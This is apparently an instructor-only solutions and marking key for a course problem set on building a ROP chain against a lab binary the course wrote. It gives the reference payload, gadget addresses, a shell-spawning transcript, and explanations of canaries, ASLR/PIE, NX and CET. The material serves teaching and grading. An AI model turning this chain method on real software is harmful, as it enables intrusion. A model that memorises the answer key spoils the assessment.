# PROG 201 · PS 10 Solutions
## A Working ROP Chain — Instructor Only

---

**Do not distribute.** Q3 is the whole assignment; a student who has read the chain has done none
of it. The reference `exploit.py` is alongside this file.

**Machine these numbers came from:** Intel i5-8250U, gcc 13.3.0, glibc 2.39, Linux 7.0.0-30. The
target is non-PIE, so **addresses are stable across builds and across machines with the same gcc** —
`unlock` at 0x4011f6, `g_pop_rdi` at 0x40125a, `g_ret` at 0x40125c. A student on a different gcc may
see different addresses; the method is what matters, and `nm vuln` gives them.

> **On teaching exploitation.** This is legitimate because it is bounded: a binary the course wrote,
> a sandbox the student controls (`setarch -R`), and a stated purpose — understanding the
> mitigations. The syllabus and PS both say so, and the last mark-bearing part (Q4) is turning the
> defences back on. If a student is uneasy, that instinct is correct and worth affirming: the skill
> is worth having because it is used to defend, and the ethics note on the PS is not boilerplate.

---

## The Reference Chain

```python
OFFSET    = 72               # Q1
G_RET     = 0x40125c         # bare ret -- alignment
G_POP_RDI = 0x40125a         # pop rdi ; ret
UNLOCK    = 0x4011f6

chain  = b'A'*OFFSET + p(G_RET) + p(G_POP_RDI) + p(0xc0ffee) + p(UNLOCK) + b'\n'
```

```
$ python3 exploit.py | setarch -R ./vuln
[unlock] correct key -- launching a shell
$ { python3 exploit.py; echo 'id -u; exit'; } | setarch -R ./vuln
INSIDE_SHELL uid=1000
```

---

## Q1 — The Offset (16)

**(a) [10]** **72.** Any correct method with working shown: the marker (`A`*72 + `BBBBBBBB`, then `0x4242...` in `$rsp` at the crash), a cyclic pattern, or gdb. Deduct for an answer with no evidence — "I tried 72 and it worked" is [4]; showing the `0x42` landing is [10].

**(b) [6]** The eight bytes at offset 72 are the **saved return address**; the eight before (64–71) are the **saved `%rbp`**. The offset (72) exceeds the buffer (64) by exactly those 8 bytes of saved frame pointer between the array and the return address. A student who says "the buffer is 72 bytes" has not understood the frame layout.

---

## Q2 — ret2win (18)

**(a) [8]** `A`*72 + `p(0x4011f6)`. It prints `[win]`/`[unlock]`'s first line and then **SIGSEGVs inside `system`**. Full marks require identifying, from gdb, that the faulting instruction is a **`movaps`** (or `movdqa`) inside `do_system`/`system`, on the stack.

**(b) [6]** The **x86-64 ABI requires `%rsp` to be 16-byte aligned at a `call`**; `system` uses SSE (`movaps`) which faults on a misaligned address. A ret2win lands `unlock` one 8-byte word off alignment, so the `movaps` faults. The fix: **one extra `ret` gadget** before the target, consuming 8 bytes and restoring alignment. [3] for naming alignment, [3] for the `ret`-gadget fix.

**(c) [4]** Arriving by a plain overwrite, `%rdi` holds **whatever the previous code left in it** — not `0xc0ffee` — so `unlock`'s check takes the wrong-key branch. This is why it must be a *chain*: you have to set `%rdi` yourself. [4] for naming that `%rdi` is uncontrolled.

---

## Q3 — The Chain (34)

**(a) [20]** A working `exploit.py` **[14]** and a transcript proving shell execution **[6]**. The chain must use both the alignment gadget and `pop rdi ; ret` — a bare ret2win with alignment that happens to work because `%rdi` is stale does **not** count and should lose most of (a); the assignment is to *control the register*.

**(b) [8]** The annotation. A correct table:

| stack word | value | what happens |
| --- | --- | --- |
| 0–71 | `AAAA…` | padding, fills buf + saved rbp |
| 72 | `0x40125c` | overflowing `ret` jumps here (bare ret) |
| 80 | `0x40125a` | that ret lands here: `pop rdi ; ret` |
| 88 | `0xc0ffee` | popped into `%rdi` |
| 96 | `0x4011f6` | `pop rdi`'s ret lands in `unlock`, rdi set |

Two marks per correct role; the load-bearing one is that **word 88 is *data* consumed by the pop, not an address the CPU jumps to.**

**(c) [6]** Both gadget addresses from `gadget.py` **[2]**, and the NX explanation **[4]**: every address in the chain points at **an instruction already in the executable text** — the gadgets and `unlock` are all on `r-x` pages — so no page needs to be executable that isn't, and NX (which only forbids executing *writable* pages like the stack) never has cause to fire. The payload is *data on the stack*, never executed as code; the CPU only ever executes the program's own bytes. Full marks require "the bytes executed were already executable", not just "ROP bypasses NX".

---

## Q4 — Turn the Defences Back On (24)

**(a) [6]** `vuln_canary`: `*** stack smashing detected ***: terminated`, **exit 134** (SIGABRT). The canary is a random per-thread value at `%fs:0x28`, placed between the locals and the return address; a contiguous overflow to the return address **must** cross it, so `__stack_chk_fail` aborts. [2] message+code, [2] what/where, [2] why unavoidable.

**(b) [6]** Against `vuln` with ASLR **on** (no `setarch`), the exploit **still works**. ASLR randomises the stack, heap and shared libraries, **but a non-PIE executable loads at a fixed base (0x400000)**, so `unlock` and the gadgets are where the chain says. The chain uses no stack or libc addresses, so nothing it depends on moved. Full marks require "non-PIE code is not randomised". This is the row that surprises students.

**(c) [6]** `vuln_pie` with ASLR on: **SIGSEGV, the chain misses**. PIE makes the executable's own code load at a random base too, so `0x4011f6` is not where `unlock` is. To make it work again the attacker needs an **information leak** — some bug that discloses a code address, from which the PIE base and therefore every gadget can be computed. [3] what changed, [3] the leak.

**(d) [6]** NX did not need defeating because **a ROP chain executes no injected code** (Q3c). On a pre-NX executable stack, the exploit would instead be the classic *Smashing the Stack*: shellcode in the buffer, return address pointing back into the buffer. `./checksec.sh vuln` reports the stack as **NX on (`RW`, not `RWE`)**. [3] why ROP is NX-clean, [1] the pre-NX shape, [2] the checksec evidence.

---

## Q5 — The Hardware Question (8)

**(a) [4]** `objdump -d vuln | grep -c endbr64` → **24**. They are **CET indirect-branch-tracking landing pads** — legal targets for an indirect jump/call. `/proc/cpuinfo` has **no `shstk` or `ibt`**, so this CPU has no CET and **nothing enforces them**; they are inert NOPs. [2] what they are, [2] the cpuinfo check.

**(b) [4]** A **canary** protects one location (the return address) against a **contiguous overwrite**, and is defeated by a leak or a non-contiguous write. A **shadow stack** keeps an unwritable second copy of *every* return address and checks it on *every* `ret`, so a ROP chain — which works entirely by corrupting return addresses — is caught at the first gadget. The canary sits in the same writable memory the overflow crosses; the shadow stack does not. This CPU does not stop the exploit because it has no CET hardware to keep the shadow copy. [2] the distinction, [2] why this machine is unprotected.

---

## Marks

| Q | Topic | Points |
|---|---|---:|
| 1 | Find the offset | 16 |
| 2 | ret2win, and why it is not enough | 18 |
| 3 | The chain | 34 |
| 4 | Turn the defences back on | 24 |
| 5 | The hardware question | 8 |
| | **Total** | **100** |

---

*PROG 201 · Week 10 · PS 10 Solutions · Instructor Only · © CSE Department*
